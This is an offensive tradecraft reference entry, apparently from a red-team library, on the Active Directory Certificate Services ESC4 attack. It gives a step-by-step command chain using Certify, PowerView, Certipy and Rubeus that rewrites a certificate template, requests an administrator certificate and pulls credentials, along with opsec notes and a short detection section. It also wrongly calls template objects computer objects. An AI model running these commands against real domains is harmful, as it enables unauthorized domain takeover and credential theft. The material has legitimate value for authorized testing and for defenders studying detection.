---
name: ADCS ESC4 — Template ACL Abuse
category: adcs
subcategories: [esc4, template-modification, certificate-template-acl]
tradecraft_tags: [adcs, esc4, template-acl, enroll-supplies-subject, acl-abuse, escalation]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://posts.specterops.io/certified-pre-owned-d95910965cd2
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Certificate template modification (attribute write on the PKI container) generates
  Event 5136 on DCs (directory service object modification). The msPKI-Enroll-Attributes
  and msPKI-Certificate-Name-Flag write on a template object is detectable. Certify/Certipy
  `find` will detect the modification afterward. MDI monitors PKI configuration changes.
usage_examples:
  - description: Identify ESC4-vulnerable templates (controlled principal with write rights)
    args: "Certify.exe find /vulnerable"
  - description: Step 1 — Add ENROLLEE_SUPPLIES_SUBJECT flag to a template we have write rights over
    args: "(PowerView) Set-DomainObject -Identity 'VulnTemplate' -Set @{msPKI-Certificate-Name-Flag=1}"
  - description: Step 2 — Request certificate with SAN for target user
    args: "Certify.exe request /ca:CASERVER\\\\CA-NAME /template:VulnTemplate /altname:administrator"
  - description: Step 3 — Authenticate with certificate
    args: "Rubeus.exe asktgt /user:administrator /certificate:<base64pfx> /getcredentials /show"
  - description: Certipy combined approach
    args: "certipy template -u user -p pass -dc-ip DC_IP -template VulnTemplate -save-old && certipy req -u user -p pass -dc-ip DC_IP -ca CA-NAME -template VulnTemplate -upn administrator@domain.local"
opsec_notes: |
  ESC4 requires write access to a certificate template object (GenericWrite, WriteDACL,
  or WriteProperty on the msPKI-* attributes). The template modification is a persistent
  AD change — it stays until manually reverted. Always save the original template
  configuration (Certipy `template -save-old`) and restore after exploitation.
  Template modification generates Event 5136 which is audited if PKI object auditing is enabled.
gotchas: |
  Template modification is PERSISTENT — it changes the template for ALL users. This could
  allow other principals to enroll in the modified template, potentially expanding the attack
  surface unexpectedly. Restore the original flags after requesting the certificate. The
  msPKI-Certificate-Name-Flag value for ENROLLEE_SUPPLIES_SUBJECT is 0x00000001 (or 1).
  Multiple flags can be set — preserve the original value and OR in the new flag rather than
  replacing. Certipy's template command handles this cleanly.
related_ttps: [certify, certipy, rubeus, whisker, sharpgpoabuse]
alternatives: [certify-esc1-direct, certipy-shadow-auto]
common_args: {}
last_updated: 2026-05-29
---

# ADCS ESC4 — Template ACL Abuse

ESC4 occurs when a low-privileged principal has write access to a certificate template
object's security-relevant attributes (msPKI-Certificate-Name-Flag, msPKI-Enroll-Attributes).
By modifying the template to add the `ENROLLEE_SUPPLIES_SUBJECT` flag, an attacker converts
a non-exploitable template into an ESC1-equivalent, then requests a certificate with an
arbitrary UPN in the Subject Alternative Name.

## The Attack Chain

```
Prerequisite: GenericWrite / WriteProp on a certificate template object
(identified by Certify find /vulnerable or BloodHound ACL edge to template DN)

1. Save original template configuration:
   certipy template -u user -p pass -dc-ip DC_IP -template VulnTemplate -save-old

2. Add ENROLLEE_SUPPLIES_SUBJECT flag:
   certipy template -u user -p pass -dc-ip DC_IP -template VulnTemplate -value 1
   OR
   PowerView: Set-DomainObject 'VulnTemplate' -Set @{msPKI-Certificate-Name-Flag=1}

3. Request certificate with admin SAN (now ESC1-equivalent):
   Certify.exe request /ca:CA /template:VulnTemplate /altname:administrator@domain.local

4. Authenticate and get hash:
   Rubeus.exe asktgt /user:administrator /certificate:<pfx> /getcredentials /show /ptt

5. RESTORE template (critical — remove ENROLLEE_SUPPLIES_SUBJECT flag):
   certipy template -u user -p pass -dc-ip DC_IP -template VulnTemplate -restore
```

## Identifying ESC4 Opportunities

SharpHound/BloodHound shows `GenericWrite` edges to PKI template objects. These are
represented as computer objects in AD — look for `CN=Templates` children. In BloodHound CE
with ADCS collection, ESC4 opportunities appear as ACL edges on template nodes.

## Why ESC4 Matters

ESC4 expands the attack surface significantly — any template that a controlled principal
can write to can be temporarily converted to an ESC1 exploit. This includes templates
that were previously "safe" but had ACL misconfiguration.
